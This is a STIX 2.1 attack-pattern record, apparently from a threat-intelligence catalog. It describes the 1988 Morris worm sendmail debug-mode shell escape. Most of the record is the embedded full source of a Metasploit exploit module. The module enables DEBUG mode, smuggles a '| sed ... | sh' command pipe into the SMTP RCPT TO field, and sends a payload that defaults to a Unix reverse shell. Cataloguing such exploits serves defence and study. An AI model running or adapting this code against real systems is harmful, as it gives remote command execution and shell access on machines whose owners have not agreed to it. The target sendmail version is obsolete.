{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7a01f966-b3ab-46a9-a38d-07c8c21a3b58",
    "created": "2024-08-14T17:14:11.623471Z",
    "modified": "2024-08-14T17:14:11.623475Z",
    "name": "Morris Worm sendmail Debug Mode Shell Escape",
    "description": " This module exploits sendmail's well-known historical debug mode to escape to a shell and execute commands in the SMTP RCPT TO command.  This vulnerability was exploited by the Morris worm in 1988-11-02. Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg.  Currently, only cmd/unix/reverse and cmd/unix/generic are supported. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/smtp/morris_sendmail_debug.rb",
            "external_id": "morris_sendmail_debug.rb"
        },
        {
            "source_name": "reference",
            "url": "http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH#Setup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  # cmd/unix/reverse spams the session with Telnet codes on EOF\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Expect\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Morris Worm sendmail Debug Mode Shell Escape',\n      'Description'    => %q{\n        This module exploits sendmail's well-known historical debug mode to\n        escape to a shell and execute commands in the SMTP RCPT TO command.\n\n        This vulnerability was exploited by the Morris worm in 1988-11-02.\n        Cliff Stoll reports on the worm in the epilogue of The Cuckoo's Egg.\n\n        Currently, only cmd/unix/reverse and cmd/unix/generic are supported.\n      },\n      'Author'         => [\n        'Robert Tappan Morris', # Exploit and worm for sure\n        'Cliff Stoll',          # The Cuckoo's Egg inspiration\n        'wvu'                   # Module and additional research\n      ],\n      'References'     => [\n        ['URL', 'https://en.wikipedia.org/wiki/Morris_worm'],         # History\n        ['URL', 'https://spaf.cerias.purdue.edu/tech-reps/823.pdf'],  # Analysis\n        ['URL', 'https://github.com/arialdomartini/morris-worm'],     # Source\n        ['URL', 'http://gunkies.org/wiki/Installing_4.3_BSD_on_SIMH'] # Setup\n      ],\n      'DisclosureDate' => '1988-11-02',\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Privileged'     => false, # DefUid in src/conf.c, usually \"daemon\"\n      'Payload'        => {'Compat' => {'RequiredCmd' => 'generic telnet'}},\n      'Targets'        => [\n        # https://en.wikipedia.org/wiki/Source_Code_Control_System\n        ['@(#)version.c       5.51 (Berkeley) 5/2/86', {}]\n      ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'}\n    ))\n\n    register_options([Opt::RPORT(25)])\n\n    register_advanced_options([\n      OptFloat.new('ExpectTimeout', [true, 'Timeout for Expect', 3.5])\n    ])\n  end\n\n  def check\n    checkcode = CheckCode::Safe\n\n    connect\n    res = sock.get_once\n\n    return CheckCode::Unknown unless res\n\n    if res =~ /^220.*Sendmail/\n      checkcode = CheckCode::Detected\n    end\n\n    sock.put(\"DEBUG\\r\\n\")\n    res = sock.get_once\n\n    return checkcode unless res\n\n    if res.start_with?('200 Debug set')\n      checkcode = CheckCode::Appears\n    end\n\n    checkcode\n  rescue EOFError, Rex::ConnectionError => e\n    vprint_error(e.message)\n    CheckCode::Unknown\n  ensure\n    disconnect\n  end\n\n  def exploit\n    # We don't care who the user is, so randomize it\n    from = rand_text_alphanumeric(8..42)\n\n    # Strip mail headers with sed(1), pass to sh(1), and ensure a clean exit\n    to = %(\"| sed '1,/^$/d' | sh; exit 0\")\n\n    # We don't have $PATH, so set one\n    path = '/bin:/usr/bin:/usr/ucb:/etc'\n\n    sploit = {\n      nil                   => /220.*Sendmail/,\n      'DEBUG'               => /200 Debug set/,\n      \"MAIL FROM:<#{from}>\" => /250.*Sender ok/,\n      \"RCPT TO:<#{to}>\"     => /250.*Recipient ok/,\n      'DATA'                => /354 Enter mail.*itself/,\n      # Indent PATH= so it's not interpreted as a mail header\n      \" PATH=#{path}\"       => nil,\n      'export PATH'         => nil,\n      payload.encoded       => nil,\n      '.'                   => /250 Ok/,\n      'QUIT'                => /221.*closing connection/\n    }\n\n    print_status('Connecting to sendmail')\n    connect\n\n    print_status('Enabling debug mode and sending exploit')\n    sploit.each do |line, pattern|\n      send_expect(\n        line,\n        pattern,\n        sock:    sock,\n        timeout: datastore['ExpectTimeout'],\n        newline: \"\\r\\n\"\n      )\n    end\n  rescue Rex::ConnectionError => e\n    fail_with(Failure::Unreachable, e.message)\n  rescue Timeout::Error => e\n    fail_with(Failure::TimeoutExpired, e.message)\n  ensure\n    disconnect\n  end\n\n  def on_new_session(session)\n    print_warning(\"Do NOT type `exit', or else you may lose further shells!\")\n    print_warning('Hit ^C to abort the session instead, please and thank you')\n  end\n\nend\n",
    "x_mitre_disclosure_date": "1988-11-02",
    "x_mitre_platforms": [
        "unix'"
    ]
}